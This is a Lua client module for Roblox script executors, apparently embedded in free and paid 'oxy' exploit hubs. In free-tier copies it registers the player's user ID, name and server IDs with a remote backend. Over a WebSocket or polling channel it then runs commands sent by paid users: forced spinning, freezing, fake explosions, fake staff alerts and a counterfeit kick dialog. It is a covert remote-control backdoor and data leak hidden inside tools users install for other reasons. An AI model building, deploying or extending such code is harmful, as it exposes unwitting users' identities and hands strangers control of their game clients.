--[[
    oxy shared client  ·  served at  <base>/client.lua
    ------------------------------------------------------------------
    ONE module, embedded by every hub (free + paid + third-party).

      local OxyNet = loadstring(game:HttpGet("https://YOUR.up.railway.app/client.lua"))()
      OxyNet.start({ backendUrl = "https://YOUR.up.railway.app", tier = "free", hubId = "oxy" })

    free  -> polls every few seconds and runs incoming prank commands on itself.
    paid  -> does NOT poll (zero background traffic); exposes getTargets()/sendCommand()
             used on demand by the admin panel. Paid is immune either way.

    Commands are prank-only — no far/teleport movement (no fling/launch/bring):
    spin, freeze, unfreeze, sit, explode, notify, fakekick, ping.
    ------------------------------------------------------------------
]]

local OxyNet = {}
OxyNet._version = 2

local Players     = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local StarterGui  = game:GetService("StarterGui")
local Debris      = game:GetService("Debris")
local RunService  = game:GetService("RunService")
local LP          = Players.LocalPlayer

local function myHum() local c = LP.Character return c and c:FindFirstChildOfClass("Humanoid") end
local function myHRP()
    local c = LP.Character
    return c and (c:FindFirstChild("HumanoidRootPart") or c.PrimaryPart or c:FindFirstChild("Torso"))
end

-- ===========================================================================
--  HTTP (executor-agnostic)
-- ===========================================================================
local function resolveRequest()
    local g = (getgenv and getgenv()) or {}
    local candidates = {
        rawget(g, "http_request"), rawget(g, "request"),
        (syn and syn.request), (http and http.request), (fluxus and fluxus.request),
        http_request, request,
    }
    for _, fn in ipairs(candidates) do
        if type(fn) == "function" then return fn end
    end
    return nil
end
local _request = resolveRequest()

local function httpJson(method, url, headers, bodyTbl)
    headers = headers or {}
    headers["Content-Type"] = "application/json"
    local body = bodyTbl and HttpService:JSONEncode(bodyTbl) or nil

    if _request then
        local ok, res = pcall(_request, { Url = url, Method = method, Headers = headers, Body = body })
        if not ok then return false, tostring(res) end
        local status = res.StatusCode or res.status or res.status_code or 0
        local text   = res.Body or res.body or ""
        if status < 200 or status >= 300 then return false, "HTTP " .. tostring(status), text end
        local okDec, decoded = pcall(function() return text ~= "" and HttpService:JSONDecode(text) or {} end)
        return true, (okDec and decoded or {})
    end
    if method == "GET" then
        local ok, text = pcall(function() return game:HttpGet(url) end)
        if not ok then return false, tostring(text) end
        local okDec, decoded = pcall(function() return HttpService:JSONDecode(text) end)
        return okDec, (okDec and decoded or text)
    end
    return false, "no POST-capable http function on this executor"
end

-- ===========================================================================
--  config / identity
-- ===========================================================================
local cfg = {
    backendUrl   = nil,
    tier         = "free",
    hubId        = "oxy",
    adminToken   = nil,
    syncInterval = 5.0,
    onCommand    = nil,
}

local function selfIdentity()
    return {
        userId      = tostring(LP.UserId),
        name        = LP.Name,
        displayName = LP.DisplayName,
        placeId     = tostring(game.PlaceId),
        jobId       = tostring(game.JobId),
        hubId       = cfg.hubId,
        tier        = cfg.tier,
        v           = OxyNet._version,
    }
end

local function toast(title, text, dur)
    pcall(function()
        StarterGui:SetCore("SendNotification", { Title = title or "oxy", Text = text or "", Duration = dur or 4 })
    end)
    local lib = shared and shared.OxyLibrary
    if lib and lib.Notify then pcall(lib.Notify, lib, (title and (title .. ": ") or "") .. (text or ""), dur or 4) end
end

-- ===========================================================================
--  PRANK EXECUTORS  (only ever run on a FREE client — see dispatch guard)
--  Nothing here touches movement/physics, so nothing here is bannable.
-- ===========================================================================
local EXEC = {}

function EXEC.ping(_, from)
    toast("oxy", ("ok · from %s"):format(from and from.name or "?"), 4)
end

function EXEC.notify(args, from)
    local title = tostring((args and args.title) or "SERVER")
    local text  = tostring((args and args.text) or "You have been noticed by staff.")
    toast(title, text, tonumber(args and args.duration) or 5)
    if args and args.big then
        pcall(function()
            local gui = Instance.new("ScreenGui")
            gui.Name = "\0"; gui.ResetOnSpawn = false; gui.IgnoreGuiInset = true
            gui.DisplayOrder = 999; gui.Parent = (gethui and gethui()) or LP:WaitForChild("PlayerGui")
            local lbl = Instance.new("TextLabel", gui)
            lbl.Size = UDim2.new(1,0,0,80); lbl.Position = UDim2.new(0,0,0.12,0)
            lbl.BackgroundTransparency = 0.25; lbl.BackgroundColor3 = Color3.fromRGB(20,20,24)
            lbl.TextColor3 = Color3.fromRGB(255,90,90); lbl.Font = Enum.Font.GothamBold
            lbl.TextScaled = true; lbl.Text = "  " .. text .. "  "
            Debris:AddItem(gui, tonumber(args.duration) or 5)
        end)
    end
end

function EXEC.fakekick(args)
    local reason = tostring((args and args.reason) or "You were kicked from this experience.")
    pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "\0"; gui.IgnoreGuiInset = true; gui.ResetOnSpawn = false
        gui.DisplayOrder = 1e6; gui.Parent = (gethui and gethui()) or LP:WaitForChild("PlayerGui")
        local dim = Instance.new("Frame", gui)
        dim.Size = UDim2.fromScale(1,1); dim.BackgroundColor3 = Color3.new(0,0,0); dim.BackgroundTransparency = 0.35
        local box = Instance.new("Frame", gui)
        box.Size = UDim2.fromOffset(420, 150); box.Position = UDim2.new(0.5,-210,0.5,-75)
        box.BackgroundColor3 = Color3.fromRGB(40,40,40); box.BorderSizePixel = 0
        Instance.new("UICorner", box).CornerRadius = UDim.new(0,6)
        local head = Instance.new("TextLabel", box)
        head.Size = UDim2.new(1,0,0,40); head.BackgroundColor3 = Color3.fromRGB(30,30,30); head.BorderSizePixel = 0
        head.Font = Enum.Font.GothamBold; head.TextSize = 18; head.TextColor3 = Color3.new(1,1,1); head.Text = "Disconnected"
        local msg = Instance.new("TextLabel", box)
        msg.Size = UDim2.new(1,-24,1,-90); msg.Position = UDim2.new(0,12,0,48)
        msg.BackgroundTransparency = 1; msg.TextWrapped = true; msg.Font = Enum.Font.Gotham
        msg.TextSize = 15; msg.TextColor3 = Color3.fromRGB(230,230,230); msg.Text = reason
        local btn = Instance.new("TextButton", box)
        btn.Size = UDim2.fromOffset(90,30); btn.Position = UDim2.new(1,-102,1,-40)
        btn.BackgroundColor3 = Color3.fromRGB(0,120,215); btn.BorderSizePixel = 0
        btn.Font = Enum.Font.GothamBold; btn.TextSize = 15; btn.TextColor3 = Color3.new(1,1,1); btn.Text = "Leave"
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)
        btn.MouseButton1Click:Connect(function() gui:Destroy() end)
        Debris:AddItem(gui, tonumber(args and args.duration) or 8)
    end)
end

-- in-place effects (rotate / hold / sit) — no far movement, so not a teleport ban risk
local frozen = { on = false, conn = nil }

function EXEC.spin(args)
    local hrp = myHRP(); if not hrp then return end
    local dur   = math.clamp(tonumber(args and args.duration) or 3, 0.5, 15)
    local speed = math.clamp(tonumber(args and args.speed) or 16, 4, 40)  -- rad/s; big values freeze the game
    local gyro = Instance.new("BodyAngularVelocity")
    gyro.MaxTorque       = Vector3.new(0, 1, 0) * 1e5   -- spin around Y only (stays upright, no physics chaos)
    gyro.P               = 1e4
    gyro.AngularVelocity = Vector3.new(0, speed, 0)
    gyro.Parent = hrp
    task.delay(dur, function() pcall(function() gyro:Destroy() end) end)
end

function EXEC.explode(args)
    local hrp = myHRP(); if not hrp then return end
    pcall(function()
        local e = Instance.new("Explosion")
        e.Position                  = hrp.Position
        e.BlastRadius               = math.clamp(tonumber(args and args.radius) or 14, 4, 40)
        e.BlastPressure             = 0   -- visual only: no fling, no ragdoll (not a movement ban risk)
        e.DestroyJointRadiusPercent = 0
        e.ExplosionType             = Enum.ExplosionType.NoCraters
        e.Parent = workspace
        local snd = Instance.new("Sound")
        snd.SoundId = "rbxassetid://165970126"; snd.Volume = 1; snd.Parent = hrp
        pcall(function() snd:Play() end)
        Debris:AddItem(e, 2); Debris:AddItem(snd, 3)
    end)
end

function EXEC.freeze(args)
    local hrp = myHRP(); if not hrp then return end
    local dur = math.clamp(tonumber(args and args.duration) or 4, 0.5, 15)
    frozen.on = true
    if frozen.conn then frozen.conn:Disconnect() end
    frozen.conn = RunService.Heartbeat:Connect(function()
        local h = myHRP()
        if frozen.on and h then pcall(function() h.Anchored = true end) end
    end)
    task.delay(dur, function() EXEC.unfreeze() end)
end

function EXEC.unfreeze()
    frozen.on = false
    if frozen.conn then frozen.conn:Disconnect(); frozen.conn = nil end
    local hrp = myHRP(); if hrp then pcall(function() hrp.Anchored = false end) end
end

function EXEC.sit()
    local hum = myHum(); if not hum then return end
    pcall(function() hum.Sit = true end)
    pcall(function() hum.Jump = true end)
end

-- ===========================================================================
--  dispatch (immunity gate lives here)
-- ===========================================================================
local seen = {}
local function dispatch(cmd)
    if cfg.tier ~= "free" then return end            -- paid clients are immune
    if not cmd or type(cmd) ~= "table" then return end
    if cmd.id then
        if seen[cmd.id] then return end
        seen[cmd.id] = true
    end
    local fn = EXEC[cmd.action]
    if not fn then return end
    if cfg.onCommand then pcall(cfg.onCommand, cmd) end
    task.spawn(function() pcall(fn, cmd.args, cmd.from) end)
end

-- ===========================================================================
--  receive: WebSocket push (preferred) + HTTP polling fallback   (FREE only)
--  A persistent socket means commands are PUSHED instantly, so the executor
--  makes no periodic HTTP calls — that is what removes the per-poll game freeze.
-- ===========================================================================
local active = false
local wsSock = nil

local function syncOnce()
    local ok, res = httpJson("POST", cfg.backendUrl .. "/api/sync", nil, selfIdentity())
    if ok and type(res) == "table" and type(res.commands) == "table" then
        for _, cmd in ipairs(res.commands) do dispatch(cmd) end
    end
end

local pollingStarted = false
local function startPolling()
    if pollingStarted then return end
    pollingStarted = true
    task.spawn(function()
        while active do
            if not wsSock then pcall(syncOnce) end   -- only polls while the socket is down
            task.wait(cfg.syncInterval)
        end
        pollingStarted = false
    end)
end

local function resolveWSConnect()
    local g = (getgenv and getgenv()) or {}
    local WS = rawget(g, "WebSocket") or WebSocket
    if type(WS) == "table" then
        if type(WS.connect) == "function" then return WS.connect end
        if type(WS.Connect) == "function" then return WS.Connect end
    end
    if syn and syn.websocket and type(syn.websocket.connect) == "function" then return syn.websocket.connect end
    return nil
end

local connectWS
connectWS = function()
    local connect = resolveWSConnect()
    if not connect then return false end
    local wsUrl = cfg.backendUrl:gsub("^http", "ws") .. "/ws"   -- https->wss, http->ws
    local ok, sock = pcall(connect, wsUrl)
    if not ok or not sock then return false end
    wsSock = sock

    local hello = selfIdentity(); hello.type = "hello"
    pcall(function() sock:Send(HttpService:JSONEncode(hello)) end)

    local onMsg = sock.OnMessage or sock.onMessage
    if onMsg and onMsg.Connect then
        onMsg:Connect(function(raw)
            local okD, cmd = pcall(function() return HttpService:JSONDecode(raw) end)
            if okD then dispatch(cmd) end
        end)
    end

    local onClose = sock.OnClose or sock.onClose
    if onClose and onClose.Connect then
        onClose:Connect(function()
            if wsSock == sock then wsSock = nil end
            if active then task.delay(5, function() if active and not wsSock then connectWS() end end) end
        end)
    end

    task.spawn(function()   -- keepalive so idle proxies don't drop the socket
        while active and wsSock == sock do
            task.wait(25)
            if wsSock == sock then pcall(function() sock:Send('{"type":"hb"}') end) end
        end
    end)
    return true
end

-- ===========================================================================
--  PAID sender API (all on demand — no background traffic)
-- ===========================================================================
function OxyNet.getTargets()
    if not cfg.backendUrl then return {} end
    local headers = { ["x-oxy-token"] = cfg.adminToken or "" }
    local ok, res = httpJson("GET", cfg.backendUrl .. "/api/targets?self=" .. tostring(LP.UserId), headers, nil)
    if ok and type(res) == "table" and type(res.targets) == "table" then return res.targets end
    return {}
end

function OxyNet.sendCommand(targetUserId, action, args)
    if not cfg.backendUrl then return false, "not started" end
    local headers = { ["x-oxy-token"] = cfg.adminToken or "" }
    return httpJson("POST", cfg.backendUrl .. "/api/command", headers, {
        targetUserId = tostring(targetUserId),
        action       = action,
        args         = args or {},
        fromUserId   = tostring(LP.UserId),
        fromName     = LP.Name,
    })
end

OxyNet.ACTIONS = { "spin", "freeze", "unfreeze", "sit", "explode", "notify", "fakekick", "ping" }

-- ===========================================================================
--  start / stop
-- ===========================================================================
function OxyNet.start(opts)
    opts = opts or {}
    assert(type(opts.backendUrl) == "string" and opts.backendUrl ~= "", "OxyNet.start: backendUrl required")
    cfg.backendUrl   = opts.backendUrl:gsub("/+$", "")
    cfg.tier         = (opts.tier == "paid") and "paid" or "free"
    cfg.hubId        = tostring(opts.hubId or "oxy")
    cfg.adminToken   = opts.adminToken
    cfg.syncInterval = tonumber(opts.syncInterval) or 5.0
    cfg.onCommand    = opts.onCommand

    shared.OxyNet = OxyNet
    if cfg.tier == "free" then
        active = true
        pcall(connectWS)   -- opens a push socket if the executor supports WebSocket
        startPolling()     -- permanent fallback: only actually polls while the socket is down
    end
    -- paid stays silent: no socket, no polling (getTargets/sendCommand are on-demand)
    return OxyNet
end

function OxyNet.stop()
    active = false
    if wsSock then pcall(function() wsSock:Close() end); wsSock = nil end
    pcall(EXEC.unfreeze)
end

OxyNet.getConfig = function() return { tier = cfg.tier, hubId = cfg.hubId, backendUrl = cfg.backendUrl } end

return OxyNet
